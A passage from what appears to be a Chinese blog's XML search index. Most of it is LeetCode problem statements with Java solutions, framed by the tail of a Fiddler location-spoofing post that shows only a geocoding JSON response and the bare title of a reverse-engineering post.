&quot;streetNumber&quot;:&quot;60号&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;province&quot;:&quot;北京市&quot;,&quot;city&quot;:&quot;&quot;,&quot;district&quot;:&quot;东城区&quot;,&quot;township&quot;:&quot;东华门街道&quot;&#125;,&quot;formattedAddress&quot;:&quot;北京市东城区东华门街道东华门大街东华门大街小区&quot;,&quot;roads&quot;:[],&quot;crosses&quot;:[],&quot;pois&quot;:[]&#125; 详细地址如下： 百度地图同理，不再过多赘述enjoy it!!!]]></content>
      <categories>
        <category>爬虫</category>
        <category>抓包</category>
      </categories>
      <tags>
        <tag>fiddler</tag>
        <tag>劫持</tag>
        <tag>伪装位置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/21]]></title>
    <url>%2Fposts%2F4280b2b8%2F</url>
    <content type="text"><![CDATA[题目：925. 长按键入难度：简单 你的朋友正在使用键盘输入他的名字 name。偶尔，在键入字符 c 时，按键可能会被长按，而字符可能被输入 1 次或多次。 你将会检查键盘输入的字符 typed。如果它对应的可能是你的朋友的名字（其中一些字符可能被长按），那么就返回 True。 示例 1： 123输入：name = &quot;alex&quot;, typed = &quot;aaleex&quot;输出：true解释：&apos;alex&apos; 中的 &apos;a&apos; 和 &apos;e&apos; 被长按。 示例 2： 123输入：name = &quot;saeed&quot;, typed = &quot;ssaaedd&quot;输出：false解释：&apos;e&apos; 一定需要被键入两次，但在 typed 的输出中不是这样。 示例 3： 12输入：name = &quot;leelee&quot;, typed = &quot;lleeelee&quot;输出：true 示例 4： 123输入：name = &quot;laiden&quot;, typed = &quot;laiden&quot;输出：true解释：长按名字中的字符并不是必要的。 提示： name.length &lt;= 1000 typed.length &lt;= 1000 name 和 typed 的字符都是小写字母。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/long-pressed-name著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟过程即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041class Solution &#123; public boolean isLongPressedName(String name, String typed) &#123; int p = 0; int q = 0; while (p &lt; name.length()) &#123; char ch = name.charAt(p); p++; int cnt = 1; while (p &lt; name.length() &amp;&amp; ch == name.charAt(p)) &#123; p++; cnt++; &#125; if (q &gt;= typed.length()) &#123; return false; &#125; if (ch != typed.charAt(q)) &#123; return false; &#125; while (q &lt; typed.length() &amp;&amp; ch == typed.charAt(q)) &#123; q++; cnt--; &#125; // System.out.println(ch+","+cnt); if (cnt &gt; 0) &#123; return false; &#125; &#125; if (q &lt; typed.length()) &#123; return false; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/20]]></title>
    <url>%2Fposts%2F3587822e%2F</url>
    <content type="text"><![CDATA[题目：143. 重排链表难度：中等 给定一个单链表 L：L0→L1→…→Ln-1→Ln ，将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→… 你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。 示例 1: 1给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3. 示例 2: 1给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reorder-list著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先遍历一遍链表，记录在arraylist中，然后使用双指针依次交换即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public void reorderList(ListNode head) &#123; if (head == null) &#123; return; &#125; List&lt;ListNode&gt; list = new ArrayList&lt;&gt;(); ListNode cur = head; while (cur != null) &#123; list.add(cur); cur = cur.next; &#125; int p = 0; int q = list.size() - 1; while (p &lt; q) &#123; list.get(p).next = list.get(q); p++; if (p == q) &#123; break; &#125; list.get(q).next = list.get(p); q--; &#125; list.get(p).next = null; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/19]]></title>
    <url>%2Fposts%2F67766949%2F</url>
    <content type="text"><![CDATA[题目：844. 比较含退格的字符串难度：简单 给定 S 和 T 两个字符串，当它们分别被输入到空白的文本编辑器后，判断二者是否相等，并返回结果。 # 代表退格字符。 注意：如果对空文本输入退格字符，文本继续为空。 示例 1： 123输入：S = &quot;ab#c&quot;, T = &quot;ad#c&quot;输出：true解释：S 和 T 都会变成 “ac”。 示例 2： 123输入：S = &quot;ab##&quot;, T = &quot;c#d#&quot;输出：true解释：S 和 T 都会变成 “”。 示例 3： 123输入：S = &quot;a##c&quot;, T = &quot;#a#c&quot;输出：true解释：S 和 T 都会变成 “c”。 示例 4： 123输入：S = &quot;a#c&quot;, T = &quot;b&quot;输出：false解释：S 会变成 “c”，但 T 仍然是 “b”。 提示： 1 &lt;= S.length &lt;= 200 1 &lt;= T.length &lt;= 200 S 和 T 只含有小写字母以及字符 ‘#’。 进阶： 你可以用 O(N) 的时间复杂度和 O(1) 的空间复杂度解决该问题吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/backspace-string-compare著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按退格修改字符后比较串即可 解题代码1234567891011121314151617181920class Solution &#123; public boolean backspaceCompare(String S, String T) &#123; return delete(S).equals(delete(T)); &#125; private String delete(String s) &#123; StringBuilder builder = new StringBuilder(); for (int i = 0;i &lt; s.length();i++) &#123; if (s.charAt(i) == '#') &#123; if (builder.length() &gt; 0) &#123; builder.deleteCharAt(builder.length() - 1); &#125; &#125; else &#123; builder.append(s.charAt(i)); &#125; &#125; return builder.toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/18]]></title>
    <url>%2Fposts%2F107159df%2F</url>
    <content type="text"><![CDATA[题目：19. 删除链表的倒数第N个节点难度：中等 给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。 示例： 123给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 n = 2.当删除了倒数第二个节点后，链表变为 1-&gt;2-&gt;3-&gt;5. 说明： 给定的 n 保证是有效的。 进阶： 你能尝试使用一趟扫描实现吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 找到要删除节点的前驱，删除节点即可 解题代码两次遍历链表 12345678910111213141516171819202122232425262728293031323334353637/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode removeNthFromEnd(ListNode head, int n) &#123; ListNode cur = head; List&lt;ListNode&gt; cache = new ArrayList&lt;&gt;(); while (cur != null) &#123; cache.add(cur); cur = cur.next; &#125; if (n == cache.size()) &#123; return head.next; &#125; // System.out.println(cache.get(cache.size() - n - 1)); cur = head; while (cur != null) &#123; if (cur == cache.get(cache.size() - n - 1)) &#123; cur.next = cur.next.next; break; &#125; cur = cur.next; &#125; return head; &#125;&#125; 双指针 1234567891011121314151617181920212223242526272829303132333435363738/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode removeNthFromEnd(ListNode head, int n) &#123; // 虚拟的头结点，为了将链表头和其他节点一视同仁 ListNode vHead = new ListNode(-1,head); // p，q初始位置相差一个，便于找到待删除节点的前驱 ListNode p = head; ListNode q = vHead; // p先往后移n个位置 while (n-- &gt; 0) &#123; p = p.next; &#125; // p，q同时后移，当p移动到最后时，q就指向待删除节点的前驱节点了 while (p != null) &#123; p = p.next; q = q.next; &#125; // 删除节点只需要操作前驱节点的指向即可 q.next = q.next.next; // System.out.println(q.val); // 虚拟的头结点是我们自己新增的，不需要 return vHead.next; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/17]]></title>
    <url>%2Fposts%2F80ce444e%2F</url>
    <content type="text"><![CDATA[题目：52. N皇后 II难度：困难 n 皇后问题研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 上图为 8 皇后问题的一种解法。 给定一个整数 n，返回 n 皇后不同的解决方案的数量。 示例: 1234567891011121314输入: 4输出: 2解释: 4 皇后问题存在如下两个不同的解法。[ [&quot;.Q..&quot;, // 解法 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, // 解法 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;]] 提示： 皇后，是国际象棋中的棋子，意味着国王的妻子。皇后只做一件事，那就是“吃子”。当她遇见可以吃的棋子时，就迅速冲上去吃掉棋子。当然，她横、竖、斜都可走一或 N-1 步，可进可退。（引用自 百度百科 - 皇后 ） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/n-queens-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 使用回溯法尝试每一个可以放置皇后的位置 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; public int totalNQueens(int n) &#123; dfs(0,n); return ans; &#125; int ans = 0; List&lt;int[]&gt; queens = new ArrayList&lt;&gt;(); private void dfs(int c,int n) &#123; if (c &gt;= n) &#123; ans++; // int a[][] = new int[n][n]; // for (int[] arr : queens) &#123; // a[arr[0]][arr[1]] = 1; // &#125; // for (int i = 0;i &lt; n;i++) &#123; // System.out.println(Arrays.toString(a[i])); // &#125; // System.out.println(); return; &#125; for (int i = 0;i &lt; n;i++) &#123; if (canPlace(c,i)) &#123; queens.add(new int[]&#123;c,i&#125;); dfs(c + 1,n); queens.remove(queens.size() - 1); &#125; &#125; &#125; private boolean canPlace(int i,int j) &#123; if (queens.size() &lt; 1) &#123; return true; &#125; for (int[] arr : queens) &#123; if (arr[0] == i || arr[1] == j || (Math.abs(arr[0] - i) == Math.abs(arr[1] - j))) &#123; return false; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/16]]></title>
    <url>%2Fposts%2Ff7c974d8%2F</url>
    <content type="text"><![CDATA[题目：977. 有序数组的平方难度：简单 给定一个按非递减顺序排序的整数数组 A，返回每个数字的平方组成的新数组，要求也按非递减顺序排序。 示例 1： 12输入：[-4,-1,0,3,10]输出：[0,1,9,16,100] 示例 2： 12输入：[-7,-3,2,3,11]输出：[4,9,9,49,121] 提示： 1 &lt;= A.length &lt;= 10000 -10000 &lt;= A[i] &lt;= 10000 A 已按非递减顺序排序。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/squares-of-a-sorted-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 两个思路，第一个是遍历数组，取平方后排序新数组，第二个是利用A已经排好序这个特点，使用双指针p（从前到后），q（从后到前），判断数组A的p，q位置元素绝对值的大小，然后逆序插入ans数组即可 解题代码平方后排序 12345678910111213141516class Solution &#123; public int[] sortedSquares(int[] A) &#123; if (A == null || A.length == 0) &#123; return A; &#125; int ans[] = new int[A.length]; for (int i = 0;i &lt; A.length;i++) &#123; ans[i] = A[i] * A[i]; &#125; Arrays.sort(ans); return ans; &#125;&#125; 双指针 1234567891011121314151617181920class Solution &#123; public int[] sortedSquares(int[] A) &#123; int[] ans = new int[A.length]; int p = 0; int q = A.length - 1; int pos = q; while (pos &gt;= 0) &#123; if (Math.abs(A[p]) &gt; Math.abs(A[q])) &#123; ans[pos--] = A[p] * A[p]; p++; &#125; else &#123; ans[pos--] = A[q] * A[q]; q--; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/15]]></title>
    <url>%2Fposts%2F6ec02562%2F</url>
    <content type="text"><![CDATA[题目：116. 填充每个节点的下一个右侧节点指针难度：中等 给定一个完美二叉树，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下： 123456struct Node &#123; int val; Node *left; Node *right; Node *next;&#125; 填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。 初始状态下，所有 next 指针都被设置为 NULL。 示例： 12345输入：&#123;&quot;$id&quot;:&quot;1&quot;,&quot;left&quot;:&#123;&quot;$id&quot;:&quot;2&quot;,&quot;left&quot;:&#123;&quot;$id&quot;:&quot;3&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:4&#125;,&quot;next&quot;:null,&quot;right&quot;:&#123;&quot;$id&quot;:&quot;4&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:5&#125;,&quot;val&quot;:2&#125;,&quot;next&quot;:null,&quot;right&quot;:&#123;&quot;$id&quot;:&quot;5&quot;,&quot;left&quot;:&#123;&quot;$id&quot;:&quot;6&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:6&#125;,&quot;next&quot;:null,&quot;right&quot;:&#123;&quot;$id&quot;:&quot;7&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:7&#125;,&quot;val&quot;:3&#125;,&quot;val&quot;:1&#125;输出：&#123;&quot;$id&quot;:&quot;1&quot;,&quot;left&quot;:&#123;&quot;$id&quot;:&quot;2&quot;,&quot;left&quot;:&#123;&quot;$id&quot;:&quot;3&quot;,&quot;left&quot;:null,&quot;next&quot;:&#123;&quot;$id&quot;:&quot;4&quot;,&quot;left&quot;:null,&quot;next&quot;:&#123;&quot;$id&quot;:&quot;5&quot;,&quot;left&quot;:null,&quot;next&quot;:&#123;&quot;$id&quot;:&quot;6&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:7&#125;,&quot;right&quot;:null,&quot;val&quot;:6&#125;,&quot;right&quot;:null,&quot;val&quot;:5&#125;,&quot;right&quot;:null,&quot;val&quot;:4&#125;,&quot;next&quot;:&#123;&quot;$id&quot;:&quot;7&quot;,&quot;left&quot;:&#123;&quot;$ref&quot;:&quot;5&quot;&#125;,&quot;next&quot;:null,&quot;right&quot;:&#123;&quot;$ref&quot;:&quot;6&quot;&#125;,&quot;val&quot;:3&#125;,&quot;right&quot;:&#123;&quot;$ref&quot;:&quot;4&quot;&#125;,&quot;val&quot;:2&#125;,&quot;next&quot;:null,&quot;right&quot;:&#123;&quot;$ref&quot;:&quot;7&quot;&#125;,&quot;val&quot;:1&#125;解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。 提示： 你只能使用常量级额外空间。 使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 使用广度优先的思路，按层序遍历二叉树即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/*// Definition for a Node.class Node &#123; public int val; public Node left; public Node right; public Node next; public Node() &#123;&#125; public Node(int _val) &#123; val = _val; &#125; public Node(int _val, Node _left, Node _right, Node _next) &#123; val = _val; left = _left; right = _right; next = _next; &#125;&#125;;*/class Solution &#123; public Node connect(Node root) &#123; if (root == null) &#123; return root; &#125; Queue&lt;Node&gt; q = new LinkedList&lt;&gt;(); q.add(root); while (!q.isEmpty()) &#123; int size = q.size(); while (size-- &gt; 0) &#123; Node p = q.poll(); if (size == 0) &#123; p.next = null; &#125; else &#123; p.next = q.peek(); &#125; if (p.left != null) &#123; q.add(p.left); &#125; if (p.right != null) &#123; q.add(p.right); &#125; &#125; &#125; return root; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/14]]></title>
    <url>%2Fposts%2F19c715f4%2F</url>
    <content type="text"><![CDATA[题目：1002. 查找常用字符难度：简单 给定仅有小写字母组成的字符串数组 A，返回列表中的每个字符串中都显示的全部字符（包括重复字符）组成的列表。例如，如果一个字符在每个字符串中出现 3 次，但不是 4 次，则需要在最终答案中包含该字符 3 次。 你可以按任意顺序返回答案。 示例 1： 12输入：[&quot;bella&quot;,&quot;label&quot;,&quot;roller&quot;]输出：[&quot;e&quot;,&quot;l&quot;,&quot;l&quot;] 示例 2： 12输入：[&quot;cool&quot;,&quot;lock&quot;,&quot;cook&quot;]输出：[&quot;c&quot;,&quot;o&quot;] 提示： 1 &lt;= A.length &lt;= 100 1 &lt;= A[i].length &lt;= 100 A[i][j] 是小写字母 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-common-characters著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 建立二维映射表，然后统计得到所有共同出现的字符的最小个数即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; public List&lt;String&gt; commonChars(String[] A) &#123; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); if (A == null || A.length &lt; 1) &#123; return ans; &#125; int[][] table = new int[A.length][26]; for (int i = 0;i &lt; A.length;i++) &#123; String s = A[i]; for (int j = 0;j &lt; s.length();j++) &#123; table[i][s.charAt(j) - 'a']++; &#125; &#125; for (int i = 0;i &lt; 26;i++) &#123; boolean flag = false; for (int j = 0;j &lt; table.length;j++) &#123; if (table[j][i] &gt; 0) &#123; flag = true; break; &#125; &#125; if (flag) &#123; int min = table[0][i]; for (int j = 0;j &lt; table.length;j++) &#123; min = Math.min(table[j][i],min); &#125; while (min-- &gt; 0) &#123; ans.add(String.valueOf((char) (i + 'a'))); &#125; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/12]]></title>
    <url>%2Fposts%2Ff0a4b0c1%2F</url>
    <content type="text"><![CDATA[题目：530. 二叉搜索树的最小绝对差难度：简单 给你一棵所有节点为非负值的二叉搜索树，请你计算树中任意两节点的差的绝对值的最小值。 示例： 12345678910111213输入： 1 \ 3 / 2输出：1解释：最小绝对差为 1，其中 2 和 1 的差的绝对值为 1（或者 2 和 3）。 提示： 树中至少有 2 个节点。 本题与 783 https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/ 相同通过次数24,166提交次数41,072 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 中序遍历二叉搜索树会得到一个升序序列，最小绝对差一定在升序序列中的相邻两个位置出现 解题代码缓存升序序列 12345678910111213141516171819202122232425262728293031323334/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int getMinimumDifference(TreeNode root) &#123; dfs(root); int ans = Integer.MAX_VALUE; for (int i = 0;i + 1&lt; seq.size();i++) &#123; int a = seq.get(i); int b = seq.get(i + 1); ans = Math.min(ans,Math.abs(a - b)); &#125; return ans; &#125; List&lt;Integer&gt; seq = new ArrayList&lt;&gt;(); private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.left); seq.add(root.val); dfs(root.right); &#125;&#125; 缓存中序遍历上一次访问的节点 12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int getMinimumDifference(TreeNode root) &#123; dfs(root); return ans; &#125; int ans = Integer.MAX_VALUE; TreeNode pre = null; private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.left); if (pre != null) &#123; ans = Math.min(ans,Math.abs(root.val - pre.val)); &#125; pre = root; dfs(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/11]]></title>
    <url>%2Fposts%2F69ade17b%2F</url>
    <content type="text"><![CDATA[题目：416. 分割等和子集难度：中等 给定一个只包含正整数的非空数组。是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。 注意: 每个数组中的元素不会超过 100数组的大小不会超过 200 示例 1: 12345输入: [1, 5, 11, 5]输出: true解释: 数组可以分割成 [1, 5, 5] 和 [11]. 示例 2: 12345输入: [1, 2, 3, 5]输出: false解释: 数组不能分割成两个元素和相等的子集. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/partition-equal-subset-sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 题意转换为在和为sum非空数组中找到一个子序列，和为sum/2，然后就可以直接搜索（深搜）了，而直接搜索太暴力，会超时，于是可以尝试剪枝或者记忆化，以提升搜索效率 解题代码123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public boolean canPartition(int[] nums) &#123; int sum = 0; for (int i = 0;i &lt; nums.length;i++) &#123; sum += nums[i]; &#125; if (sum % 2 != 0) &#123; return false; &#125; return dfs(nums,0,0,sum / 2); &#125; Map&lt;String,Boolean&gt; ms = new HashMap&lt;&gt;(); private boolean dfs(int nums[],int i,int curSum,int target) &#123; String key = curSum + "&amp;" + i; if (ms.containsKey(key)) &#123; return ms.get(key); &#125; if (i &gt; nums.length - 1 || curSum &gt; target) &#123; return false; &#125; if (curSum == target) &#123; return true; &#125; boolean res = dfs(nums,i + 1,curSum + nums[i],target) || dfs(nums,i + 1,curSum,target); ms.put(key,res); return res; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/10]]></title>
    <url>%2Fposts%2F1eaad1ed%2F</url>
    <content type="text"><![CDATA[题目：142. 环形链表 II难度：中等 给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 说明：不允许修改给定的链表。 示例 1： 123输入：head = [3,2,0,-4], pos = 1输出：tail connects to node index 1解释：链表中有一个环，其尾部连接到第二个节点。 ： 示例 2： 123输入：head = [1,2], pos = 0输出：tail connects to node index 0解释：链表中有一个环，其尾部连接到第一个节点。 示例 3： 123输入：head = [1], pos = -1输出：no cycle解释：链表中没有环。 进阶：你是否可以不用额外空间解决此题？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/linked-list-cycle-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用hash表缓存遍历过的节点，或者使用快慢指针观察快慢指针会不会相遇，如果相遇表示有环，此时将快指针移动到链表头并转变成慢指针的移动方式，原来的慢指针则继续遍历，当快慢指针再次相遇时，即代表找到了环开始的位置 解题代码hash表 1234567891011121314151617181920212223242526/** * Definition for singly-linked list. * class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; * val = x; * next = null; * &#125; * &#125; */public class Solution &#123; public ListNode detectCycle(ListNode head) &#123; Set&lt;ListNode&gt; set = new HashSet&lt;&gt;(); while (head != null) &#123; if (!set.add(head)) &#123; return head; &#125; head = head.next; &#125; return null; &#125;&#125; 快慢指针 123456789101112131415161718192021222324252627282930313233/** * Definition for singly-linked list. * class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; * val = x; * next = null; * &#125; * &#125; */public class Solution &#123; public ListNode detectCycle(ListNode head) &#123; ListNode p = head; ListNode q = head; while (p != null &amp;&amp; q != null &amp;&amp; q.next != null) &#123; p = p.next; q = q.next.next; if (p == q) &#123; q = head; while (p != q) &#123; p = p.next; q = q.next; &#125; return p; &#125; &#125; return null; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/10/09]]></title>
    <url>%2Fposts%2F7e6d5808%2F</url>
    <content type="text"><![CDATA[题目：141. 环形链表难度：简单 给定一个链表，判断链表中是否有环。 如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。 如果链表中存在环，则返回 true 。 否则，返回 false 。 进阶： 你能用 O(1)（即，常量）内存解决此问题吗？ 示例 1： 123输入：head = [3,2,0,-4], pos = 1输出：true解释：链表中有一个环，其尾部连接到第二个节点。 示例 2： 123输入：head = [1,2], pos = 0输出：true解释：链表中有一个环，其尾部连接到第一个节点。 示例 3： 123输入：head = [1], pos = -1输出：false解释：链表中没有环。 提示： 链表中节点的数目范围是 [0, 104] -105 &lt;= Node.val &lt;= 105 pos 为 -1 或者链表中的一个 有效索引 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/linked-list-cycle著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用hash表缓存遍历过的节点，或者使用快慢指针观察指针会不会相遇 解题代码hash表 12345678910111213141516171819202122232425/** * Definition for singly-linked list. * class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; * val = x; * next = null; * &#125; * &#125; */public class Solution &#123; public boolean hasCycle(ListNode head) &#123; Set&lt;ListNode&gt; set = new HashSet&lt;&gt;(); while(head != null)&#123; if(set.contains(head))&#123; return true; &#125; else &#123; set.add(head); &#125; head = head.next; &#125; return false; &#125;&#125; 快慢指针 12345678910111213141516171819202122232425262728293031/** * Definition for singly-linked list. * class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; * val = x; * next = null; * &#125; * &#125; */public class Solution &#123; public boolean hasCycle(ListNode head) &#123; if (head == null) &#123; return false; &#125; ListNode p = head; ListNode q = head.next; while (p != null &amp;&amp; q != null &amp;&amp; q.next != null) &#123; p = p.next; q = q.next.next; if (p == q) &#123; return true; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向分析智慧成信APP加密方案过程记录]]></title>
    <url>%2Fposts%2Ffdae2772%2F</url>
